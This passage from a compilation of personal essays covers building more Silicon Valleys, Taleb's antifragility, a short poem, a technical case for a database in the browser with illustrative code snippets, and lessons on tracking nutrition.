flock, companies will be created, the successes will produce more
investors, and the recursive loop will go on

## Fin

And that's it. Easier said than done, but I really think it boils down
to these 4 ingredients. Shift your culture to laud ambitious outlooks,
clean up regulation, attract talent, capital will flock, and you've got
innovation on your hands.

What would happen if more cities took this to heart? Would we have a
1000 Silicon Valleys?

I'd bet that power laws will still pervade. There will be some cities
that have 10 times the clump of talent than other cities. But, there's
enough talent in the world to massively increase the number of clumps.
If we had a thousand cities doing this, and graphed the productive
output, I'd bet that all of the productivity of Silicon Valley today
would represent some dot on the lower end of that graph.

The world continues to face immense challenges, and I believe these
represent immense opportunities. Never-mind 1000 Silicon Valleys, if
just had 5 or more, I can't imagine what would happen.

------------------------------------------------------------------------

I have been heavily inspired by Marc Andreessen and Paul Graham in my
career, and they themselves have essays on how to make the next Silicon
Valley ([1](http://www.paulgraham.com/siliconvalley.html),
[2](http://www.paulgraham.com/kate.html),
[3](http://www.paulgraham.com/pgh.html),
[4](https://a16z.com/2020/04/18/its-%20time-to-build/),
[5](https://www.politico.com/magazine/story/2014/06/turn-%20detroit-into-drone-valley-107853))
--- I highly suggest reading them too.

*Thanks to Daniel Woelfel, Ian Sinnott, for reviewing drafts of this
essay*

# Antifragility

When Darwin introduced evolution with *The Origin of Species* , not only
did it change how we saw life on earth, but it turned out to be much
more general than we thought. We see it everywhere: from how innovation
happens, how languages and cultures form, to how markets operate.

When you look at the world through the lens of evolution, what's opaque
becomes common sense and your vision of the world changes in kind.

The same, I think, can be said with Nassim Taleb's *Incerto*. Yes, I
have just compared him with Darwin.

Time will tell, but I think it's merited. I've re-read Taleb's work at
least four times now, and each time I come out with new realizations.
Similar to evolution, his ideas of Black Swans and Antifragility sprout
up all around us. It can change everything from how you eat, how you
work, how you build friendships, how you invest, how you innovate, and
much more.

I wanted to share the most impactful idea that I got out of it with you.
This is my own words, and it is nowhere near enough to capture his
work's complete implication. I hope it gives you an exciting lens and
piques your curiosity enough to read Taleb's books.

## Predicting the Future

The place to start is with the question: *how does the future happen*?

We often think that it's an unfolding of predictable events. It
certainly seems that way when you read history. For example, we learn
that World War I was an obvious consequence: countries were arming and
had all these pacts, so of course, the war was a foregone conclusion.

But this is one of the most incredible illusions of all. With World War
I, for example, we went from assassination in Austria-Hungary to an
all-out war between superpowers in a matter of... *one week*.

No one predicted that. It would be analogous to China and America
declaring hostilities next Friday.

This idea would have been hard to swallow before 2019, but I think
enough has happened for us to reflect. No one predicted the exact
consequences of COVID. No one expected that protesters would storm into
the capitol building in January.

If breathtaking changes can happen in a matter of days, we need to
revise our beliefs about how the future unfolds.

It's not predictable. Instead, what Taleb calls "Black Swans" drive the
future. These are events that are so unlikely that they're unpredictable
and so consequential that they change reality as we know it.

And that puts us in an uncomfortable situation --- in a world dominated
by events you can't predict, how do you live your life?

## The Triad

Here comes, I think, one of Taleb's most meaningful insights. You can't
know the future, but you *can* know how well you could handle it.

Here's what I mean. Take anything, and ask yourself: how would this
react if something *out of the ordinary* happened?

For example, think about a piece of expensive china. Just about anything
out of the ordinary would break it. At best, nothing terrible will
happen. At worst, it will disintegrate. You could say that this piece of
china is *fragile* towards the unexpected.

Now let's look at a kettlebell. Up to a point, just about anything out
of the ordinary would do *little harm* to the kettlebell. In most cases,
nothing terrible will happen. It won't suddenly become any better, but
at least it won't break. We could say that this kettlebell is *robust*
towards the unexpected.

Now, consider this essay itself. If someone reads it and sees that it's
wrong, that person could let me know, and I would fix it. If they're
furious and make a fuss on the internet, it only gets more people
reading it. And of course, if people love it, again more would read it.
At *worse,* this essay will stay the same. In many cases, it will
benefit. You could say that this essay is *antifragile* towards the
unexpected \[1\].

Nassim calls this the "triad" --- fragile, robust, antifragile --- and
you can start to identify just about all aspects of life within it.

Just exploring this triad can fill you with insights. For example,
tinkering is antifragile. Banks are fragile. Gold is robust. Dollars are
fragile. Individuals are fragile at the expense of the collective, which
is antifragile. Why, and what does it mean? Expounding on the
consequences would take a series of books... so you can appreciate the
beauty and breadth of Nassim's work.

For this essay, I'll focus on just one slice of one thing. What can you
do with this triad in your own life?

## Barbell

Well, you can learn to *love* the future. If you can organize your life
so that you remove your fragility and add antifragility, you can, as
Nassim says, *"be the fire and wish for the wind."*

Here's how. Look over your life, and start to catalogue your exposure.

Is your work fragile, robust, or antifragile? Are your finances fragile,
robust, or antifragile? Are your attachments fragile, robust, or
antifragile?

Now, take all that is fragile, and try to move them towards robust.

Here's an example. Say you have most of your net worth invested in
stocks. Are your fragile, robust, or antifragile?

Well, imagine if your portfolio increases by 20%. You'll be happy for
sure. But, imagine if your portfolio *decreases* by 20%. Likely, you'll
be devastated. You have more to lose than to gain from the unexpected
here. This means that you are *fragile* in your investments.

How can you move this towards robust? Two ways.

The first is philosophical. Just write off a large part of your
investment mentally. Maybe 50% \[2\]. Now, even if a 50% downturn
happens, you only got what you expected. Arguably, you are robust
towards the unexpected.

The second is practical. Move to more robust investments: stuff like
gold, very cheap real estate in a small, resilient country, etc.

At this point, you may ask --- you don't *just* want robust. How can you
*win*?

Well, now it's time to add antifragility.

Can you set aside some amount for crazy risks? You can write this
portion off completely, so at worst, what happens is what you expected:
you lose it all. However, at best, you have upside.

The key is to choose the kind of activities that have a profound upside.
If one win pays for a thousand losses, you are in a good place. How does
this look?

Here's a basket of ideas: start a company, invest in highly speculative
ideas, make a youtube video, write a book, move to a city that excites
you, learn to program, tinker, share. If you do that, suddenly, you
can't wait to see what the future holds.

Nassim calls this the "Barbell Strategy" --- change your exposure to 90%
robust, 10% antifragile.

Here's one more example. Say you have a slight headache. There's a new
medication that could fix it. Should you take it?

Well, in the best case, your headache is gone. But since it's slight,
this is not such a big deal. At worst, who knows what can happen? Here,
you are *fragile* towards this medication.

Now, imagine you are about to die, but a new, experimental medication
can save you. At worst, you die, which is what you expect to happen.
But, in the best case, you survive. Here, you are *antifragile* to this
medication.

Wow. We\'ve just used the triad as a compass for our life. Note the
beauty here: at no point have we talked about specific risk modeling.
It's so simple that you don't need any math. That's pretty darn
beautiful.

## Fin

And with that, we learn one of the most interesting ideas: it's not
about predicting the future; it's about not having to predict the
future.

You know what books to check out for a much deeper, broader, and
sometimes hilarious view.

Fair warning, though: the biggest complaint with Taleb is that he comes
off as arrogant. I honestly think this is a misunderstanding in tone.
Imagine whenever you read him that you're talking with an animated
elder, under a sunlit garden in Lebanon, with a good bottle of arak.
You'll see humor where there was arrogance.

------------------------------------------------------------------------

*Thanks to Alex Reichert, Joe Averbukh, Mark Shlick, Jacky Wang, Alexey
Gurevich, for reviewing drafts of this essay*

# The poem

The poem advanced\
For eons and eons it flew\
In rhapsody it grew\
It's majesty unwritable\
With no ears to hear\
Until one day, the poem yearned for a listener\
So it drew verse upon verse\
And a pattern emerged\
From those patterns came more patterns still\
So that one noonday,\
A pattern of patterns took stock of what they saw\
And for a moment\
Heard the eternal tune

# Database in the Browser, a Spec

How will we build web applications in the future?

If progress follows it\'s usual strategy, then whatever is difficult and
valuable to do today will become easy and normal tomorrow. I imagine
we\'ll discover new abstractions, which will make writing Google Docs as
easy as the average web app is today.

This begs the question --- what will those abstractions look like? Can
we discover them today? One way to find out, is to look at all the
schleps we have to go through in building web applications, and see what
we can do about it.

Dear reader, this essay is my attempt to follow that plan. We'll take a
tour of what it\'s like to build a web application today: we\'ll go over
the problems we face, assess solutions like Firebase, Supabase, Hasura
and friends, and see what\'s left to do. I think by the end, you\'ll
agree with me that one of the most useful abstractions looks like a
database in the browser. I\'m getting ahead of myself though, let\'s
start at the beginning:

## Client

The journey begins with Javascript in the browser

### A. Data Plumbing

The first job we have is to fetch information and display it in
different places. For example, we may display a friends list, a friends
count, a modal with a specific group of friends, etc

The problem we face, is that all components need to see consistent
information. If one component sees different data for friends, it's
possible that you'll get the wrong \"count\" showing up, or a different
nickname in one view versus another.

To solve for this, we need to have a central source of truth. So,
whenever we fetch anything, we normalize it and plop it in one place
(often a *store)*. Then, each component reads and transforms the data it
needs (using a *selector* ), It's not uncommon to see something like:

\[code\]

    // normalise [posts] -> {[id]: post}
    fetchRelevantPostsFor(user).then(posts => {
      posts.forEach(post => {
        store.addPost(post);
      })
    })

    // see all posts by author: 
    store.posts.values().reduce((res, post) => { 
      res[post.authorId] = res[post.authorId] || []; 
      res[post.authorId].push(post);
      return res;
    }, {})

\[/code\]

The question here is, *why* should we need to do all this work? We write
custom code to massage this data, while databases have solved this
problem for a long time now. We should be able to *query* for our data.
Why can't we just do:

\[code\]

    SELECT posts WHERE post.author_id = ?; 

\[/code\]

on the information that we have *inside* the browser?

### B. Change

The next problem is keeping data up to date. Say we remove a friend ---
what should happen?

We send an API request, wait for it to complete, and write some logic to
\"remove\" all the information we have about that friend. Something like
this:

\[code\]

    deleteFriend(user, friend.id).then(res => { 
      userStore.remove(friend.id);
      postStore.removeUserPosts(friend.id);
    })

\[/code\]

But, this can get hairy to deal with quick: we have to remember every
place in our store that could possibly be affected by this change. It's
like playing garbage collector in our heads. Our heads are not good at
this.

One way folks avoid it, is to skip the problem and just re-fetch the
whole world:

\[code\]

    deleteFriend(user, id).then(res => {
      fetchFriends(user);
      fetchPostsRelevantToTheUser(user);
    })

\[/code\]

Neither solutions are very good. In both cases, there are implicit
invariants we need to be aware of (based on this change, what other
changes do we need to be aware of?) and we introduce lag in our
application.

The rub is, whenever we make a change to the database, it does it's job
without us having to be so prescriptive. Why can't this just happen
automatically for us in the browser?

\[code\]

    DELETE FROM friendships WHERE friend_one_id = ? AND friend_two_id = ?
    -- Browser magically updates with all the friend and post information removed

\[/code\]

### C. Optimistic Updates

The problem you may have noticed with B., was that we had to *wait* for
friendship removal to update our browser state.

In most cases, we can make the experience snappier with an optimistic
update --- after all, we know that the call will likely be a success. To
do this, we do something like:

\[code\]

    friendPosts = userStore.getFriendPosts(friend);
    userStore.remove(friend.id);
    postStore.removeUserPosts(friend.id);
    deleteFriend(user, id).catch(e => { 
      // undo
      userStore.addFriend(friend);
      postStore.addPosts(friendPosts);
    })

\[/code\]

This is even more annoying. Now we need to manually update the success
operation, *and* the failure operation.

Why is that? On the backend, a database is able to do optimistic updates
\[1\] --- why can't we do that in in the browser?

\[code\]

    DELETE friendship WHERE friend_one_id = ? AND friend_two_id = ?
    -- local store optimistically updated, if operation fails we undo

\[/code\]

### D. Reactivity

And data doesn't just change from our own actions. Sometimes we need to
connect to changes that other users make. For example, someone could
unfriend us, or someone could send us a message.

To make this work, we need to do the same work that we did in our API
endpoints, but this time on our websocket connection:

\[code\]

    ws.listen(`${user.id}/friends-removed`, friend => { 
      userStore.remove(friend.id);
      postStore.removeUserPosts(friend.id);
    }

\[/code\]

But, this introduces two problems. First, we need to play garbage
collector again, and remember every place that could be affected by an
event.

Second, if we do optimistic updates, we have race conditions. Imagine
you run an optimistic update, setting the color of a shape to `blue`,
while a stale reactive update comes in, saying it's `red`.

\[code\]

    1. Optimistic Update: `Blue`
    2. Stale reactive update: `Red`
    3. Successful Update, comes in through socket: `Blue`

\[/code\]

Now, you'll see a flicker. The optimistic update will come in to `blue`,
a reactive update will change it to `red`, but once the optimistic
update succeeds, a new reactive update will turn it back to blue again.
\[2\]

Solving stuff like this has you dealing with consistency issues,
scouring literature on...databases.

It doesn't have to be that way though. What if each query was
*reactive*?

\[code\]

    SELECT friends.* FROM users as friends JOIN friendships on friendship.user_one_id ...

\[/code\]

Now, any change in friendships would automatically update the view
subscribed to this query. You wouldn't have to manage what changes, and
your local database could figure out what the \"most recent update\" is,
removing much of the complexity.

## Server

It only gets harder on the server.

### E. Endpoints

Much of backend development ends up being a sort of glue between the
database and and the frontend.

\[code\]

    // db.js
    function getRelevantPostsFor(userId) { 
        db.exec("SELECT * FROM posts WHERE ...")
    }

    // api.js
    app.get("relevantPosts", (req, res) => { 
      res.status(200).send(getRelevantPosts(req.userId));
    }) 

\[/code\]

This is so repetitive that we end up creating scripts to generate these
files. But why do we need to do this at all? They are often coupled very
closely to the client anyways. Why can't we just expose the database to
the client?

### F. Permissions

Well, the reason we don't, is because we need to make sure permissions
are correctly set. You should only see posts by your friends, for
example. To do this, we add middleware to our API endpoints:

\[code\]

    app.put("user", auth, (req, res) => { 
      ...
    }

\[/code\]

But, this ends up getting more and more confusing. What about
websockets? New code changes sometimes introduce ways to update database
objects that you didn't expect. All of a sudden, you're in trouble.

The question to ask here, is why is authentication at the API level?
Ideally, we should have something *very close* to the database, making
sure any data access passes permission checks. There's row-level
security on databases like Postgres, but that can get hairy quick \[3\].
What if you could \"describe\" entities near the database?

\[code\]

    User { 
      view: [
        IAllowIfAdmin(),
        IAllowIfFriend(),
        IAllowIfSameUser(),
      ]
      write: [
        IAllowIfAdmin(),
        IAllowIfSameUser(),
      ]
    }

\[/code\]

Here we compose authentication rules, and make sure that *any* way you
try to write too and update a user entity, you are guaranteed to that
you are permitted. All of a sudden, instead of most code changes
affecting permissions, only a few do.

### G. Audits, Undo / Redo

And at some point, we get requirements that blow up complexity for us.

For example, say we need to support \"undo / redo\", for friendship
actions. A user deletes a friend, and then they press \"undo\" --- how
could we support this?

We can't just delete the friendship relation, because if we did, then we
wouldn't know if this person was \"already friends\", or was just asking
now to become friends. In the latter case we may need to send a friend
request.

To solve this, we'd evolve our data model. Instead of a single
friendship relation, we'd have \"friendship facts\"

\[code\]

    [
      {status: "friends", friend_one_id: 1, friend_two_id: 2, at: 1000}, 
      {status: "disconnected", friend_one_id: 1, friend_two_id: 2, at: 10001},
    ]

\[/code\]

Then the \"latest fact\" would represent whether there is a friendship
or not.

This works, but most databases weren't designed for it: the queries
don't work as we expect, optimizations are harder than we expect. We end
up having to be *very* careful about how we do updates, in case we end
up accidentally deleting records.

All of a sudden, we become \"sort of database engineers\", devouring
literature on query optimization.

This kind of requirement seems unique, but it's getting more common. If
you deal with financial transactions, you need something like this for
auditing purposes. Undo / Redo is a necessity in lots of apps.

And god forbid an error happens and we accidentally delete data. In a
world of facts there would be no such thing --- you can just undo the
deletions. But alas, this is not the world most of us live in.

There *are* models that treat facts as a first class citizen (Datomic,
which we'll talk about soon), but right now they're so foreign that it's
rarely what engineers reach too. What if it wasn\'t so foreign?

### H. Offline Mode

There's more examples of difficulty. What about offline mode? Many apps
are long-running and can go for periods without internet connection. How
can we support this?

We would have to evolve our data model again, but this time *really*
keep just about everything as a \"fact\", and have a client-side
database that evolve it's internal state based on them. Once a
connection is made, we should be able to reconcile changes.

This gets extremely hard to do. In essence, anyone who implements this
becomes a database engineer full-stop. But, if we had a database in the
browser, and it acted like a \"node\" in a distributed database,
wouldn't this just happen automatically for us?

Turns out, fact-based systems in fact make this much, much easier. Many
think we need to resort to operational transforms to do stuff like this,
but as figma showed \[4\], as long as we're okay with having a single
leader, and are fine with last-write-wins kind of semantics, we can
drastically simplify this and just facts are enough. When time for even
more serious resolution comes, you can open up the OT rabbit hole.

Imagine...offline mode off the bat. What would the most applications
feel like after this?

### I. Reactivity

We talked about reactivity from the client. On the server it's worrying
too. We have to ensure that *all* the relevant clients are updated when
data changes. For example, if a \"post\" is added, we *need* to make
sure that all possible subscriptions related to this post are notified.

\[code\]

    function addPost(post) {
      db.addPost(post);
      getAllFriends(post).forEach(notifyNewPost);
    }

\[/code\]

This can get hairy. It's hard to know *all* the topics that could be
related. It could also be easy to miss: if a database is updated with a
query outside of `addPost`, we'd never know. This work is up to the
developer to figure out. It starts off easy, but gets ever more complex.

Yet, the database *could* be aware of all these subscriptions too, and
*could* just handle updating the relevant queries. But most don't.
RethinkDB is the shining example that did this well. What if this was
possible with the query language of your choice?

### J. Derived Data

Eventually, we end up needing to put our data in different places:
either caches (Redis), search indexes (ElasticSearch), or analytics
engines (Hive). Doing this becomes pretty daunting. You may need to
introduce some sort of a queue (Kafka), so all of these derived sources
are kept up to date. Much of this involves provisioning machines,
introducing service discovery, and the whole shebang.

Why is this so complicated though? In a normal database you can do
something like:

\[code\]

    CREATE INDEX ...

\[/code\]

Why can't we do that, for other services? Martin Kleppman, in his Data
Intensive Applications, suggests a language like this:

\[code\]

    db |> ElasticSearch
    db |> Analytics
    db.user |> Redis
    // Bam, we've connected elastic search, analytics, and redis to our db

\[/code\]

## Monkey Wrenches

Wow, we've gone up to **J.** But these are only issues you start to face
once you start building your application. What about before?

### K. TTP --- Time to Prototype

Perhaps the most restrictive problem for developers today is how hard it
is to get started. If you want to store user information and display a
page, what do you do?

Before, it was a matter of `index.html` and FTP. Now, it's webpack,
typescript, build processes galore, often multiple services. There are
so many moving pieces that it's hard to take a step.

This can seem like a problem only inexperienced people need to contend
with, and if they just spent some time they'll get faster. I think it's
more important than that. Most projects live on the fringe --- they
aren't stuff you do as a day job. This means that even a few minutes
delay in prototyping could kill a magnitude more projects.

Making this step easier would dramatically increase the number of
applications we get to use. What if it was *easier* than `index.html`
and `FTP`?

## Current Solutions

Wow, that's a lot of problems. It may seem bleak, but if you just look a
few years back, it's surprising how much has improved. After all, we
don't need to roll our own racks anymore. And in the spirit of the early
days of painting, many great folks are working on solutions to these
problems. What are some of them?

### 1) Firebase

I think Firebase has done some of the most innovative work in moving web
application development forward. The most important thing they got
right, was a **database on the browser.**

With firebase, you query your data the same way you would on the server.
By creating this abstraction, they solved **A-E.** Firebase handles
optimistic updates, and is reactive by default. It obviates the need for
endpoints by providing support for permissions.

They're strength also stems for **K:** I think it still has the *best*
time- to-prototype in the market. You can just start with index.html!

However, it has two problems:

First, query strength. Firebase's choice of a document model makes the
abstraction simpler to manage, but it destroys your query capability.
Very often you'll fall into a place where you have to de-normalize data,
or querying for it becomes tricky. For example, to record a many-to-many
relationship like a friendship, you'd need to do something like this:

\[code\]

    userA: 
      friends: 
        userBId: true 
    userB:
      friends:
        userAId: true

\[/code\]

You de-normalize friendships across two different paths
(userA/friends/userBId) and (userB/friends/userAId). Grabbing the full
data requires you to manually replicate a join:

\[code\]

    1. get `userA/friends`
    2. for each id, get `/${id}`

\[/code\]

These kind of relationships sprout up very quickly in your application.
It would be great if a solution helped you handle it.

Second, permissions. Firebase lets you write permissions using a limited
language. In practice, these rules get hairy quickly --- to the point
that folks resort to writing some higher-level language themselves and
compiling down to Firebase rules.

We experimented a lot on this at Facebook, and came to the conclusion
that you need a *real language* to express permissions. If Firebase had
that, it would be much more powerful.

With the remaining items (audits, Undo / Redo, Derived Data) ---
Firebase hasn't tackled them yet.

### 2) Supabase

Supabase is trying to do what Firebase did for Mongo, but for Postgres.
If they did this, it would be quite an attractive option, as it would
solve Firebase's biggest problem: query strength.

Supabase has some great wins so far. Their auth abstraction is great,
which makes it one of the few platforms that are as easy to get started
with as firebase was.

Their realtime option allows you to subscribe to row-level updates. For
example, if we wanted to to know whenever a friendship gets created,
updated, or changed, we could write this:

\[code\]

    const friendsChange = supabase
      .from('friendships:friend_one_id=eq.200')
      .on('*', handleFriendshipChange)
      .subscribe()

\[/code\]

This in practice can get you far. It can get hairy though. For example,
if a friend is created, we may not have the user information and we'd
have to fetch it.

\[code\]

    function handleFriendshipChange(friendship) { 
      if (!userStore.get(friendship.friend_two_id)) { 
          fetchUser(...)
      }
    }

\[/code\]

This points to Supabase's main weakness: it doesn't have a \"database on
the browser\" abstraction yet. Though you can make queries, you are
responsible for normalizing and massaging data. This means that they
can't do optimistic updates automatically, reactive queries, etc.

Their permission model is also similar to Firebase, in that they defer
to Postgres' row-level security. This can be great to start out, like
Firebase gets hairy quickly. Often these rules can slow down the query
optimizer, and the SQL itself gets harder and harder to reason about.

### 3) GraphQL + Hasura

GraphQL is an excellent way to declaratively define data you want from
the client. services like Hasura can take a database like Postgres, and
do smart things like give you a GraphQL API out of it.

Hasura is very compelling for reads. They do a smart job of figuring
joins, and can get you a good view for your data. With a flip, you can
turn any query into a subscription. When I first tried turning a query
into a subscription, it certainly felt magical.

The big issue today with GraphQL tools in general, is their
time-to-prototype. You often need multiple different libraries and build
steps. Their write-story is also a little less compelling. Optimistic
Updates don't just happen automatically --- you have to bust it
yourself.

### Lay of the Land

We've looked at the three most promising solutions. Right now, Firebase
solves the most problems off the bat. Supabase gives you query strength
at the expense of more client-side support. Hasura gives you more
powerful subscriptions and more powerful local state, at the expense of
time-to- prototype. As far as I can see, none are handling conflict
resolution, undo / redo, powerful reactive queries on the client yet.

## Future

Now the question: what will the evolution of these tools look like?

In some ways, the future is happening now. I think Figma, for example,
is an app from the future: it handles handle offline-mode, undo / redo
and multiplayer beautifully.

If we wanted to make an app like that, what would an ideal abstraction
for data look like?

### Requirements

#### 1) A database on the client, with a *powerful* query language

From the browser, this abstraction would have to be like firebase, *but
with a strong query language.*

You should be able to query your local data, and it should be as
powerful as SQL. Your queries should be reactive, and update
automatically if there are changes. It should handle optimistic updates
for you too.

\[code\]

    user = useQuery("SELECT * FROM users WHERE id = ?", 10); 

\[/code\]

#### 2) A real permission language

Next up, we'd need a composable permission language. FB's EntFramework
is the example I keep going back too, because of how powerful it was. We
should be able to define rules on entities, and should just be
guaranteed that we won't accidentally see something we're not allowed to
see.

\[code\]

    User { 
      view: [
        IAllowIfAdmin(),
        IAllowIfFriend(),
        IAllowIfSameUser(),
      ]
      write: [
        IAllowIfAdmin(),
        IAllowIfFriend(),
      ]
    }

\[/code\]

#### 3) Offline Mode & Undo / Redo

Finally, this abstraction should make it easy for us to implement
offline mode, or undo redo. If a local write happens, and there's a
conflicting write on the server, there should be a reconciler which does
the right thing most of the time. If there are issues, we should be able
to nudge it along in the right direction.

Whatever abstraction we choose, it should give us the ability to run
writes while we're offline.

#### 4) The Next Cloud

Finally, we should be able to express data dependencies without having
to spin anything up. With a simple

\[code\]

    db.user |> Redis

\[/code\]

all queries to users would magically be cached by Redis.

### Sketch of an Implementation

Okay, those requirements sound magical. What would an implementation
look like today?

#### Datomic & Datascript

In the Clojure world, folks have long been fans of Datomic, a
facts-based database that lets you \"see every change over time\".
Nikita Tonsky also implemented datascript, *a client-side database and
query engine* with the same semantics as Datomic!

They've been used to build offline-enabled applications like Roam, or
collaborative applications like Precursor. If we were to package up a
Datomic- like database on the backend, and datascript-like database on
the frontend, it *could* become \"database on the client with a powerful
query language\"!

#### Reactivity

Datomic makes it easy for you to subscribe to new committed facts to the
database. What if we made a service on top if, which kept queries and
listened to these facts. From a change, we would update the relevant
query. All of a sudden, our database becomes realtime!

#### Permission Language

Our server could accept code fragments, which it runs when fetching
data. These fragments would be responsible for permissions, giving us a
powerful permission language!

#### Pipe

Finally, we can write up some DSL, which lets you pipe data to Elastic
Search, Redis, etc, all according to the user's preferences.

With that, we have a compelling offering.

### Considerations

So, why doesn't this exist yet? Well\...

#### Datalog is unfamiliar

If we were to use a Datomic-like database, we wouldn't use SQL anymore.
Datomic uses a logic-based query language called Datalog. Now, it is
just as, if not more, powerful than SQL. The only gotcha is that for the
uninitiated it looks very daunting:

\[code\]

    [:find [(pull ?c [:conversation/user :conversation/message]) ...]
     :where [?e :session/thread ?thread-id] 
            [?c :conversation/thread ?thread-id]]

\[/code\]

This query would find all messages, alongside with the user information,
for the active thread in this current \"session\". Not bad!

Once you get to know it, it's an unbelievably elegant language. However,
I don't think that's enough. Time-to-prototype needs to be blazing fast,
and having to learn this may be too much.

There have been some fun experiments in making this easier. Dennis
Heihoff tried [using natural
language](https://twitter.com/denik/status/1290415892367540227) for
example. This points to an interesting solution: Could we write a
slightly more verbose, but more natural query language that compiles to
Datalog? I think so.

The other problem, is that data modeling is also different from what
people are used too. Firebase is the gold-standard, where you can write
your first mutation without specifying any schema.

Though it will be hard, I think we should aim to be as close to \"easy\"
as possible. Datascript only requires you to indicate references and
multi-valued attributes. Datomic requires a schema, but perhaps if we
used an open-source, datalog-based database, we could enhance it to do
something similar. Either as little schema as possible, or a \"magically
detectable schema\".

#### Datalog would be hard to make reactive

A big problem with both SQL and Datalog, is that based on some new
change, it's hard to figure out *which* queries need to be updated.

I don't think it's impossible though. Hasura does polling and it scaled
\[5\]. We *could* try having a specific language for subscriptions as
well, similar to Supabase. If we can prove certain queries can only
change by some subset of facts, we can move them out of polling.

This is a hard problem, but I think it's a tractable one.

#### A permission language would slow things down

One problem with making permission checks a full-blown language, is that
we're liable to overfetch data.

I think this is a valid concern, but with a database like Datomic, we
could handle it. Reads are easy to scale and cache. Because everything's
a fact, we could create an interface that guides people to only fetch
the values they need.

Facebook was able to do it. It will be hard, but it's possible.

#### It may be too large of an abstraction

Frameworks often fail to generalize. For example, what if we wanted to
share mouse position? This is ephemeral state and doesn't fit in a
database, but we do need to make it realtime --- where would we keep it?
There's a lot of these- kinds-of-things that are going to pop up if you
build an abstraction like this, and you're likely to get it wrong.

I do think this is a problem. If someone were to tackle this, the best
bet would be to go the Rails approach: Build a production app using it,
and extract the internals out as a product. I think they'd have a good
shot at finding the right abstraction.

#### It will only be used for toys

The common issue with these kind of products, is that people will only
use them for hobby projects, and there won't be a lot of money in it. I
think Heroku and Firebase point to a bright future here.

Large companies start as side-projects. Older engineers may look at
Firebase like a toy, but many a successful startup now runs on it.
Instead of being a just a database, perhaps it'll become a whole new
platform --- the successor to AWS.

#### The Market is very competitive

The market is competitive and the users are fickle. Slava's [Why
RethinkDB
Failed](https://www.defmacro.org/2017/01/18/why-rethinkdb-failed.html)
paints a picture for how hard it is to win in the developer tools
market. I don't think he is wrong. Doing this would require a compelling
answer to how you'll build a moat, and expand towards *The Next AWS*.

## Fin

Well, we covered the pains, covered the competitors, covered an ideal
solution, and went through the considerations. Thank you for walking
with me on this journey!

### Like-Minded Folks

These ideas are not new. My friends Sean Grove and Daniel Woelfel's
built [Dato](https://www.youtube.com/watch?v=BiplJ4AFwCc), a framework
that integrated a bunch of these ideas. Nikita Tonsky wrote [Web After
Tomorrow](https://tonsky.me/blog/the-web-after-tomorrow/) an essay with
a very similar spirit. Perhaps most exciting, I discovered
<http://homebase.io>: their ideas look very compelling, and are looking
for the solution in a similar way.

It may require some iteration to figure out the interface, but the
there's an interesting road ahead.

### Next Up

I'm toying with some ideas in this direction. The big problem to solve
here, is how important this is for people, and whether a good
abstraction can work. To solve the first, I wrote this essay. Is this a
hair-on-fire problem that you're facing? If it is, to the point that
you're actively looking for solutions, please reach out to me on
[Twitter](https://twitter.com/stopachka)! I'd love to learn your use
case 🙂. As I create applications, I'll certainly keep this back of mind
--- who knows, maybe a good abstraction can be pulled out.

*Thanks Joe Averbukh, Sean Grove, Ian Sinnott, Daniel Woelfel, Dennis
Heihoff, Mark Shlick, Alex Reichert, Alex Kotliarskyi, Thomas Schranz,
for reviewing drafts of this essay*

-   [Mandarin
    Translation](https://www.infoq.cn/article/Q4LMhpQUOfyevy5itBsN)

# Observability and Iteration in Nutrition

For the last four years I was lucky to be coached and trained by Trevor
Toy, a great friend and the best Personal Trainer I've worked with. I
wanted to share with you one of the most important lessons he taught me.

Although most of our time was spent together in the gym, this lesson was
about...how to relate to food. It was particularly striking to me,
because what he taught me was similar to the kinds of stuff [I already
shared about in Software Engineering](https://stopa.io/post/227).
Without further ado, let's get into it.

We are seldom conscious about what we eat. When we are, it's often
because we're on a diet. And to the average dieter, this translates to
feeling hungry all the time.

A sufficiently determined person can deal with that feeling for a while.
If you are an athlete and have a competition ahead for example, there's
no end to what you'll do to reach your target weight. But for the
majority, this feeling predetermines failure.

Why?

Because our weight isn't the only priority in our life. If you're
feeling hungry all the time your mood is affected, and it's likely that
you experience periods of low energy throughout the day. If you're
focused on performance in any other area of your life, you'll notice
detrimental effects immediately. Now you have a choice to make: continue
your diet and sacrifice your other priorities, or sacrifice your diet
and deliver on your other priorities?

For me, this was never a choice. I looked at my work as my art, and I
couldn't sustain anything that I believed would lead me to perform
poorly. This often lead to scenarios like this: I start dieting, and
within days I notice my cognitive ability decline in the middle of the
day. One too many days, and I would resort to what I *knew* would work
--- if I just had some sugar right then, I knew I could continue
performing. Goodbye diet, hello micro kitchen \[1\].

Within the problem lies the seed for the solution. Why did I go for the
sugar?

Because the sugar had *purpose* for me. It was a muddled purpose: a
combination of stress-relief, with a certainty that it would help me
perform for the next few hours. But, purpose it was. And that's the key
phrase *.*

Trevor showed me that the only time I looked for purpose in food was
when I was making mistakes. But in reality, everything you eat
throughout the day serves a purpose **.** **For the practitioner on the
path to advanced fitness,** the main purpose of food is to give you
ample energy throughout the day.\*\*

So Trevor challenged me to expand my view and start to look at all the
food I ate, and seek their purpose. By unraveling that, I could begin to
address root causes.

So, how do you find it?

In the beginning we're rarely aware of what we eat. We need to bring
that to the forefront, and add *observability.* Just as an in Software
Engineering, this usually means logging.

![tail -f
mfp](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEyNDUyNzQ3Mi1hMTVkMGQwMC1kZGQzLTExZWItODViMy0xZDBkYjA5YzljZWEucG5n)

As you log what you eat, it's time to look at the output: how are you
performing and feeling throughout the day?

**The key insight to ingrain as you go through this, is that feeling
tired or sluggish is not the natural consequence of eating healthy**. As
soon as this happens, it's time to analyze why. When did you last eat?
What was the nutrient breakdown of what you ate? How many calories have
you had so far? How does this day compare to a different day where you
felt better? What's changed?

All of a sudden, you'll come across realization after realization.
You'll notice foods that help you feel more full. You may end up eating
an apple right before a workout, and notice the difference that it made
to your performance in the gym. Bam, that's very valuable information.

The best way to systematize these wins, is to have a cadence where you
identify novelty, address it, and integrate it back into your diet. A
sort-of weekly review certainly helps. Of course this may already sound
familiar --- it is one of the best ways to prevent outages from
recurring in Software Engineering!

A common counterpoint with what I've written, is that it seems like a
reduction to look at food solely for nutrition. What about the pleasure
of experiencing the works of a great chef?

I think there's validity here, but the ideal of this vision is often at
odds with reality. How many times does one experience such gastronomical
delight? If they experienced it daily, would it have any meaning that
point? Unless delight was the highest priority, what would people do
when second-order effects materialized, and interfered with what's most
important in their lives?

I'd argue that for the average day, the purpose must lie in nutrition.
The more you do this, the more you begin to enjoy the simple, clean
